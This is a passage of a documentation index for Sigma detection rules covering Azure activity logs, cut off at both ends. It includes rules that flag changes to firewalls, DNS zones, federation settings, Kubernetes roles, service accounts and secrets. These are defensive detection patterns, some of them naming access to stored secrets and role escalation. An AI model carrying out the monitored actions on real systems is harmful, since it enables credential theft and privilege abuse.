Deleted id: 46530378-f9db-4af9-a9e5-889c177d3881 description: Identifies when a device or device configuration in azure is modified or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/09/03 references: - https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/reference-audit-activities#core-directory logsource: product: azure service: azure.activitylogs detection: selection: properties.message: - Delete device - Delete device configuration - Update device - Update device configuration condition: selection level: medium tags: - attack.impact falsepositives: - Device or device configuration being modified or deleted may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Device or device configuration modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_device_or_configuration_modified_or_deleted.yml/","tags":["attack.impact"],"title":"Azure Device or Configuration Modified or Deleted"},{"categories":null,"contents":"Identifies when DNS zone is modified or deleted.\nKnown false-positives DNS zone modified and deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. DNS zone modification from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes Raw rule (edit) title: Azure DNS Zone Modified or Deleted id: af6925b0-8826-47f1-9324-337507a0babd description: Identifies when DNS zone is modified or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/08/08 references: - https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes logsource: product: azure service: azure.activitylogs detection: selection: properties.message|startswith: MICROSOFT.NETWORK/DNSZONES properties.message|endswith: - /WRITE - /DELETE condition: selection level: medium tags: - attack.impact falsepositives: - DNS zone modified and deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - DNS zone modification from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_dns_zone_modified_or_deleted.yml/","tags":["attack.impact"],"title":"Azure DNS Zone Modified or Deleted"},{"categories":null,"contents":"Identifies when an user or application modified the federation settings on the domain.\nKnown false-positives Federation Settings being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Federation Settings modified from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://attack.mitre.org/techniques/T1078 Raw rule (edit) title: Azure Domain Federation Settings Modified id: 352a54e1-74ba-4929-9d47-8193d67aba1e description: Identifies when an user or application modified the federation settings on the domain. author: Austin Songer status: experimental date: 2021/09/06 references: - https://attack.mitre.org/techniques/T1078 logsource: product: azure service: azure.signinlogs detection: selection: properties.message: Set federation settings on domain condition: selection level: medium tags: - attack.initial_access - attack.t1078 falsepositives: - Federation Settings being modified or deleted may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Federation Settings modified from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_federation_modified.yml/","tags":["attack.initial_access","attack.t1078"],"title":"Azure Domain Federation Settings Modified"},{"categories":null,"contents":"Identifies when a firewall is created, modified, or deleted.\nKnown false-positives Firewall being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Firewall modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations Raw rule (edit) title: Azure Firewall Modified or Deleted id: 512cf937-ea9b-4332-939c-4c2c94baadcd description: Identifies when a firewall is created, modified, or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/08/08 references: - https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations logsource: product: azure service: azure.activitylogs detection: selection: properties.message: - MICROSOFT.NETWORK/AZUREFIREWALLS/WRITE - MICROSOFT.NETWORK/AZUREFIREWALLS/DELETE condition: selection level: medium tags: - attack.impact falsepositives: - Firewall being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Firewall modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_firewall_modified_or_deleted.yml/","tags":["attack.impact"],"title":"Azure Firewall Modified or Deleted"},{"categories":null,"contents":"Identifies when Rule Collections (Application, NAT, and Network) is being modified or deleted.\nKnown false-positives Rule Collections (Application, NAT, and Network) being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Rule Collections (Application, NAT, and Network) modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations Raw rule (edit) title: Azure Firewall Rule Collection Modified or Deleted id: 025c9fe7-db72-49f9-af0d-31341dd7dd57 description: Identifies when Rule Collections (Application, NAT, and Network) is being modified or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/08/08 references: - https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations logsource: product: azure service: azure.activitylogs detection: selection: properties.message: - MICROSOFT.NETWORK/AZUREFIREWALLS/APPLICATIONRULECOLLECTIONS/WRITE - MICROSOFT.NETWORK/AZUREFIREWALLS/APPLICATIONRULECOLLECTIONS/DELETE - MICROSOFT.NETWORK/AZUREFIREWALLS/NATRULECOLLECTIONS/WRITE - MICROSOFT.NETWORK/AZUREFIREWALLS/NATRULECOLLECTIONS/DELETE - MICROSOFT.NETWORK/AZUREFIREWALLS/NETWORKRULECOLLECTIONS/WRITE - MICROSOFT.NETWORK/AZUREFIREWALLS/NETWORKRULECOLLECTIONS/DELETE condition: selection level: medium tags: - attack.impact falsepositives: - Rule Collections (Application, NAT, and Network) being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Rule Collections (Application, NAT, and Network) modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_firewall_rule_collection_modified_or_deleted.yml/","tags":["attack.impact"],"title":"Azure Firewall Rule Collection Modified or Deleted"},{"categories":null,"contents":"Identifies when a Firewall Rule Configuration is Modified or Deleted.\nKnown false-positives Firewall Rule Configuration being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Firewall Rule Configuration modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations Raw rule (edit) title: Azure Firewall Rule Configuration Modified or Deleted id: 2a7d64cf-81fa-4daf-ab1b-ab80b789c067 description: Identifies when a Firewall Rule Configuration is Modified or Deleted. author: Austin Songer @austinsonger status: experimental date: 2021/08/08 references: - https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations logsource: product: azure service: azure.activitylogs detection: selection: properties.message: - MICROSOFT.NETWORK/FIREWALLPOLICIES/RULECOLLECTIONGROUPS/WRITE - MICROSOFT.NETWORK/FIREWALLPOLICIES/RULECOLLECTIONGROUPS/DELETE - MICROSOFT.NETWORK/FIREWALLPOLICIES/RULEGROUPS/WRITE - MICROSOFT.NETWORK/FIREWALLPOLICIES/RULEGROUPS/DELETE condition: selection level: medium tags: - attack.impact falsepositives: - Firewall Rule Configuration being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Firewall Rule Configuration modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_network_firewall_rule_modified_or_deleted.yml/","tags":["attack.impact"],"title":"Azure Firewall Rule Configuration Modified or Deleted"},{"categories":null,"contents":"Detects when a Azure Kubernetes Cluster is created or deleted.\nKnown false-positives Kubernetes cluster being created or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Kubernetes cluster created or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/ https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/ https://medium.com/mitre-engenuity/att-ck-for-containers-now-available-4c2359654bf1 https://attack.mitre.org/matrices/enterprise/cloud/ Raw rule (edit) title: Azure Kubernetes Cluster Created or Deleted id: 9541f321-7cba-4b43-80fc-fbd1fb922808 description: Detects when a Azure Kubernetes Cluster is created or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/08/07 references: - https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes - https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/ - https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/ - https://medium.com/mitre-engenuity/att-ck-for-containers-now-available-4c2359654bf1 - https://attack.mitre.org/matrices/enterprise/cloud/ logsource: product: azure service: azure.activitylogs detection: selection: properties.message: - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/WRITE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/DELETE condition: selection level: low tags: - attack.impact falsepositives: - Kubernetes cluster being created or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Kubernetes cluster created or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_kubernetes_cluster_created_or_deleted.yml/","tags":["attack.impact"],"title":"Azure Kubernetes Cluster Created or Deleted"},{"categories":null,"contents":"Identifies when a Azure Kubernetes network policy is modified or deleted.\nKnown false-positives Network Policy being modified and deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Network Policy being modified and deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/ https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/ https://medium.com/mitre-engenuity/att-ck-for-containers-now-available-4c2359654bf1 https://attack.mitre.org/matrices/enterprise/cloud/ Raw rule (edit) title: Azure Kubernetes Network Policy Change id: 08d6ac24-c927-4469-b3b7-2e422d6e3c43 description: Identifies when a Azure Kubernetes network policy is modified or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/08/07 references: - https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes - https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/ - https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/ - https://medium.com/mitre-engenuity/att-ck-for-containers-now-available-4c2359654bf1 - https://attack.mitre.org/matrices/enterprise/cloud/ logsource: product: azure service: azure.activitylogs detection: selection: properties.message: - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/NETWORKING.K8S.IO/NETWORKPOLICIES/WRITE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/NETWORKING.K8S.IO/NETWORKPOLICIES/DELETE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/EXTENSIONS/NETWORKPOLICIES/WRITE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/EXTENSIONS/NETWORKPOLICIES/DELETE condition: selection level: medium tags: - attack.impact - attack.credential_access falsepositives: - Network Policy being modified and deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Network Policy being modified and deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_kubernetes_network_policy_change.yml/","tags":["attack.impact","attack.credential_access"],"title":"Azure Kubernetes Network Policy Change"},{"categories":null,"contents":"Detects the creation or patching of potential malicious RoleBinding/ClusterRoleBinding.\nKnown false-positives RoleBinding/ClusterRoleBinding being modified and deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. RoleBinding/ClusterRoleBinding modification from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/ https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/ https://medium.com/mitre-engenuity/att-ck-for-containers-now-available-4c2359654bf1 https://attack.mitre.org/matrices/enterprise/cloud/ Raw rule (edit) title: Azure Kubernetes RoleBinding/ClusterRoleBinding Modified and Deleted id: 25cb259b-bbdc-4b87-98b7-90d7c72f8743 description: Detects the creation or patching of potential malicious RoleBinding/ClusterRoleBinding. author: Austin Songer @austinsonger status: experimental date: 2021/08/07 references: - https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes - https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/ - https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/ - https://medium.com/mitre-engenuity/att-ck-for-containers-now-available-4c2359654bf1 - https://attack.mitre.org/matrices/enterprise/cloud/ logsource: product: azure service: azure.activitylogs detection: selection: properties.message: - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/RBAC.AUTHORIZATION.K8S.IO/CLUSTERROLEBINDINGS/WRITE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/RBAC.AUTHORIZATION.K8S.IO/CLUSTERROLEBINDINGS/DELETE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/RBAC.AUTHORIZATION.K8S.IO/ROLEBINDINGS/WRITE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/RBAC.AUTHORIZATION.K8S.IO/ROLEBINDINGS/DELETE condition: selection level: medium tags: - attack.impact - attack.credential_access falsepositives: - RoleBinding/ClusterRoleBinding being modified and deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - RoleBinding/ClusterRoleBinding modification from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_kubernetes_rolebinding_modified_or_deleted.yml/","tags":["attack.impact","attack.credential_access"],"title":"Azure Kubernetes RoleBinding/ClusterRoleBinding Modified and Deleted"},{"categories":null,"contents":"Identifies when a Kubernetes account access a sensitive objects such as configmaps or secrets.\nKnown false-positives Sensitive objects may be accessed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Sensitive objects accessed from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/ https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/ https://medium.com/mitre-engenuity/att-ck-for-containers-now-available-4c2359654bf1 https://attack.mitre.org/matrices/enterprise/cloud/ Raw rule (edit) title: Azure Kubernetes Secret or Config Object Access id: 7ee0b4aa-d8d4-4088-b661-20efdf41a04c description: Identifies when a Kubernetes account access a sensitive objects such as configmaps or secrets. author: Austin Songer @austinsonger status: experimental date: 2021/08/07 references: - https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes - https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/ - https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/ - https://medium.com/mitre-engenuity/att-ck-for-containers-now-available-4c2359654bf1 - https://attack.mitre.org/matrices/enterprise/cloud/ logsource: product: azure service: azure.activitylogs detection: selection: properties.message: - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/CONFIGMAPS/WRITE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/CONFIGMAPS/DELETE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/SECRETS/WRITE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/SECRETS/DELETE condition: selection level: medium tags: - attack.impact falsepositives: - Sensitive objects may be accessed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Sensitive objects accessed from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_kubernetes_secret_or_config_object_access.yml/","tags":["attack.impact"],"title":"Azure Kubernetes Secret or Config Object Access"},{"categories":null,"contents":"Identifies when ClusterRoles/Roles are being modified or deleted.\nKnown false-positives ClusterRoles/Roles being modified and deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. ClusterRoles/Roles modification from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/ https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/ https://medium.com/mitre-engenuity/att-ck-for-containers-now-available-4c2359654bf1 https://attack.mitre.org/matrices/enterprise/cloud/ Raw rule (edit) title: Azure Kubernetes Sensitive Role Access id: 818fee0c-e0ec-4e45-824e-83e4817b0887 description: Identifies when ClusterRoles/Roles are being modified or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/08/07 references: - https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes - https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/ - https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/ - https://medium.com/mitre-engenuity/att-ck-for-containers-now-available-4c2359654bf1 - https://attack.mitre.org/matrices/enterprise/cloud/ logsource: product: azure service: azure.activitylogs detection: selection: properties.message: - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/RBAC.AUTHORIZATION.K8S.IO/ROLES/WRITE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/RBAC.AUTHORIZATION.K8S.IO/ROLES/DELETE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/RBAC.AUTHORIZATION.K8S.IO/ROLES/BIND/ACTION - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/RBAC.AUTHORIZATION.K8S.IO/ROLES/ESCALATE/ACTION - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/RBAC.AUTHORIZATION.K8S.IO/CLUSTERROLES/WRITE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/RBAC.AUTHORIZATION.K8S.IO/CLUSTERROLES/DELETE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/RBAC.AUTHORIZATION.K8S.IO/CLUSTERROLES/BIND/ACTION - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/RBAC.AUTHORIZATION.K8S.IO/CLUSTERROLES/ESCALATE/ACTION condition: selection level: medium tags: - attack.impact falsepositives: - ClusterRoles/Roles being modified and deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - ClusterRoles/Roles modification from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_kubernetes_role_access.yml/","tags":["attack.impact"],"title":"Azure Kubernetes Sensitive Role Access"},{"categories":null,"contents":"Identifies when a service account is modified or deleted.\nKnown false-positives Service account being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Service account modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/ https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/ https://medium.com/mitre-engenuity/att-ck-for-containers-now-available-4c2359654bf1 https://attack.mitre.org/matrices/enterprise/cloud/ Raw rule (edit) title: Azure Kubernetes Service Account Modified or Deleted id: 12d027c3-b48c-4d9d-8bb6-a732200034b2 description: Identifies when a service account is modified or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/08/07 references: - https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes - https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/ - https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/ - https://medium.com/mitre-engenuity/att-ck-for-containers-now-available-4c2359654bf1 - https://attack.mitre.org/matrices/enterprise/cloud/ logsource: product: azure service: azure.activitylogs detection: selection: properties.message: - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/SERVICEACCOUNTS/WRITE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/SERVICEACCOUNTS/DELETE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/SERVICEACCOUNTS/IMPERSONATE/ACTION condition: selection level: medium tags: - attack.impact falsepositives: - Service account being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Service account modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_kubernetes_service_account_modified_or_deleted.yml/","tags":["attack.impact"],"title":"Azure Kubernetes Service Account Modified or Deleted"},{"categories":null,"contents":"Identifies when a Firewall Policy is Modified or Deleted.\nKnown false-positives Firewall Policy being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Firewall Policy modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations Raw rule (edit) title: Azure Network Firewall Policy Modified or Deleted id: 83c17918-746e-4bd9-920b-8e098bf88c23 description: Identifies when a Firewall Policy is Modified or Deleted. author: Austin Songer @austinsonger status: experimental date: 2021/09/02 references: - https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations logsource: product: azure service: azure.activitylogs detection: selection: properties.message: - MICROSOFT.NETWORK/FIREWALLPOLICIES/WRITE - MICROSOFT.NETWORK/FIREWALLPOLICIES/JOIN/ACTION - MICROSOFT.NETWORK/FIREWALLPOLICIES/CERTIFICATES/ACTION - MICROSOFT.NETWORK/FIREWALLPOLICIES/DELETE condition: selection level: medium tags: - attack.impact falsepositives: - Firewall Policy being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Firewall Policy modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_network_firewall_policy_modified_or_deleted.yml/","tags":["attack.impact"],"title":"Azure Network Firewall Policy Modified or Deleted"},{"categories":null,"contents":"Identifies when a network security configuration is modified or deleted.\nKnown false-positives Network Security Configuration being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Network Security Configuration modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations Raw rule (edit) title: Azure Network Security Configuration Modified or Deleted id: d22b4df4-5a67-4859-a578-8c9a0b5af9df description: Identifies when a network security configuration is modified or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/08/08 references: - https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations logsource: product: azure service: azure.activitylogs detection: selection: properties.message: - MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/WRITE - MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/DELETE - MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/SECURITYRULES/WRITE - MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/SECURITYRULES/DELETE - MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/JOIN/ACTION - MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/PROVIDERS/MICROSOFT.INSIGHTS/DIAGNOSTICSETTINGS/WRITE condition: selection level: medium tags: - attack.impact falsepositives: - Network Security Configuration being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Network Security Configuration modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_network_security_modified_or_deleted.yml/","tags":["attack.impact"],"title":"Azure Network Security Configuration Modified or Deleted"},{"categories":null,"contents":"Identifies when a owner is was removed from a application or service principal in Azure.\nKnown false-positives Owner being removed may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Owner removed from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/reference-audit-activities#application-proxy Raw rule (edit) title: Azure Owner Removed From Application or Service Principal id: 636e30d5-3736-42ea-96b1-e6e2f8429fd6 description: Identifies when a owner is was removed from a application or service principal in Azure. author: Austin Songer @austinsonger status: experimental date: 2021/09/03 references: - https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/reference-audit-activities#application-proxy logsource: product: azure service: azure.activitylogs detection: selection: properties.message: - Remove owner from service principal - Remove owner from application condition: selection level: medium tags: - attack.defense_evasion falsepositives: - Owner being removed may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Owner removed from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_owner_removed_from_application_or_service_principal.yml/","tags":["attack.defense_evasion"],"title":"Azure Owner Removed From Application or Service Principal"},{"categories":null,"contents":"Identifies when a Point-to-site VPN is Modified or Deleted.\nKnown false-positives Point-to-site VPN being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Point-to-site VPN modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations Raw rule (edit) title: Azure Point-to-site VPN Modified or Deleted id: d9557b75-267b-4b43-922f-a775e2d1f792 description: Identifies when a Point-to-site VPN is Modified or Deleted. author: Austin Songer @austinsonger status: experimental date: 2021/08/08 references: - https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations logsource: product: azure service: azure.activitylogs detection: selection: properties.message: - MICROSOFT.NETWORK/P2SVPNGATEWAYS/WRITE - MICROSOFT.NETWORK/P2SVPNGATEWAYS/DELETE - MICROSOFT.NETWORK/P2SVPNGATEWAYS/RESET/ACTION - MICROSOFT.NETWORK/P2SVPNGATEWAYS/GENERATEVPNPROFILE/ACTION - MICROSOFT.NETWORK/P2SVPNGATEWAYS/DISCONNECTP2SVPNCONNECTIONS/ACTION - MICROSOFT.NETWORK/P2SVPNGATEWAYS/PROVIDERS/MICROSOFT.INSIGHTS/DIAGNOSTICSETTINGS/WRITE condition: selection level: medium tags: - attack.impact falsepositives: - Point-to-site VPN being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Point-to-site VPN modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_network_p2s_vpn_modified_or_deleted.yml/","tags":["attack.impact"],"title":"Azure Point-to-site VPN Modified or Deleted"},{"categories":null,"contents":"Identifies when a service principal is created in Azure.\nKnown false-positives Service principal being created may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Service principal created from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/reference-audit-activities#application-proxy Raw rule (edit) title: Azure Service Principal Created id: 0ddcff6d-d262-40b0-804b-80eb592de8e3 description: Identifies when a service principal is created in Azure. author: Austin Songer @austinsonger status: experimental date: 2021/09/02 references: - https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/reference-audit-activities#application-proxy logsource: product: azure service: azure.activitylogs detection: selection: properties.message: \u0026#39;Add service principal\u0026#39; condition: selection level: medium tags: - attack.defense_evasion falsepositives: - Service principal being created may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Service principal created from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_service_principal_created.yml/","tags":["attack.defense_evasion"],"title":"Azure Service Principal Created"},{"categories":null,"contents":"Identifies when a service principal was removed in Azure.\nKnown false-positives Service principal being removed may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Service principal removed from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/reference-audit-activities#application-proxy Raw rule (edit) title: Azure Service Principal Removed id: 